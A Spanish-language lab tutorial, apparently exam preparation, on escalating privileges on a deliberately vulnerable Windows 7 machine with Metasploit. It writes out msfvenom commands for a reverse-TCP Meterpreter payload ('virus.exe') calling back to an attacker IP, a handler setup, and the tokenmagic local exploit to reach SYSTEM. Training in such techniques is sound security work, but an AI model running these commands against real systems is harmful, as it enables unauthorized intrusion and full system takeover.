
----
- TAG: #Escalada-De-Privilegios #Metasploit #Linux #Windows 
------
## Escalada de Privilegios en Windows utilizando Metasploit

En este apartado, exploraremos la escalada de privilegios en sistemas operativos **Windows** utilizando la herramienta **Metasploit** para automatizar parcialmente el proceso.

### Requisitos

1. **Kali Linux** como máquina atacante.
2. **Windows Vulnerable** como máquina víctima - [Descargar aquí](https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing).

### Pasos

1. **Conseguir una sesión de Meterpreter**

   El primer paso es obtener una sesión de **Meterpreter** en la máquina **Windows 7**. Esto es crucial, ya que la escalada de privilegios requiere que la intrusión ya esté realizada.

   Crea un payload con `msfvenom` de la siguiente manera:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o virus.exe 
```

   Aquí, `LHOST` debe ser la dirección IP de tu máquina atacante, y `LPORT` es el puerto por donde recibirás la conexión. El archivo `.exe` generado será el que otorgue acceso a la máquina.

   Es importante que la sesión de **Meterpreter** esté activa para poder escalar privilegios con Metasploit. Si al ejecutar el payload te encuentras con un error relacionado con la arquitectura de bits, verifica si la máquina Windows es de 32 o 64 bits. En caso de ser de 64 bits, usa:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o virus.exe 
```

   **Nota:** Durante el examen, es probable que no necesites especificar los bits.

2. **Compartir el Payload mediante un servidor Python**

   Comparte el payload utilizando un servidor Python:

```bash
python3 -m http.server 80 
```

   Desde la máquina **Windows**, accede al navegador e ingresa la dirección IP de la máquina atacante (Kali Linux) para descargar el payload.

3. **Iniciar Metasploit y Configurar el Listener**

   En la máquina Kali Linux, abre **Metasploit**:

```bash
msfconsole
```

   Configura el **multi/handler** para escuchar la conexión entrante de **Meterpreter**:

```bash
use multi/handler
```

   Verifica las configuraciones necesarias:

```bash
show options
```

   Asigna la dirección IP de la máquina atacante:

```bash
set LHOST 1.2.3.4
```

   El puerto `4444` suele estar configurado por defecto, así que déjalo tal cual.

   Asigna el **Payload** creado previamente:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

   Si todo está bien, deberías obtener una sesión de **Meterpreter**.

4. **Obtener una Sesión de Shell**

   Dentro de **Meterpreter**, puedes obtener una sesión interactiva de shell escribiendo:
 
```bash
shell
```

   Esto te permitirá ejecutar comandos como `whoami`. Sin embargo, el objetivo es obtener privilegios de **NT Authority System**.

5. **Escalada de Privilegios**

   Para escalar privilegios, primero sal de la shell con `Ctrl + C` y regresa a la sesión de **Meterpreter**. Luego, envía la sesión al fondo:

```bash
background
```

   Realiza una búsqueda automatizada de exploits para escalar privilegios:

```bash
search local_exploit_suggester
```

   Esto debería mostrarte una lista de exploits disponibles. Utiliza el que te interesa:

```bash
use 0 
```

   Revisa las opciones necesarias:

```bash
show options
```

   Identifica la sesión activa previamente e indica el ID de la sesión:

```bash
sessions -l
```

   Si la sesión es la `1`, configúralo así:

```bash
set SESSION 1
```

   Ejecuta el exploit para localizar las vulnerabilidades y encontrar el exploit adecuado:

```bash
run
```

   Entre los exploits encontrados, solo los que aparecen en verde son útiles. En este caso, utiliza el siguiente exploit:

```bash
use exploit/windows/local/tokenmagic
```

   Configura el exploit con el ID de la sesión y la dirección IP de la máquina atacante:

```bash
set SESSION 1 
set LHOST 1.2.3.4
```

   Cambia el puerto `LPORT` para evitar conflictos:

```bash
 set LPORT 5555
```

   Ejecuta el exploit para obtener otra sesión de **Meterpreter**:

```bash
run 
```

   Esta vez, deberías tener privilegios de administrador. Confírmalo con:

```bash
shell
```

   Y luego:

```bash
whoami
```

   Ahora deberías estar logueado como `NT Authority System`.

### Conclusión

Obtener privilegios de `NT Authority System` es esencial, ya que este usuario tiene control total sobre el sistema local. Dominar esta técnica es crucial para el examen, ya que en al menos una máquina será necesario realizar una escalada de privilegios.

---

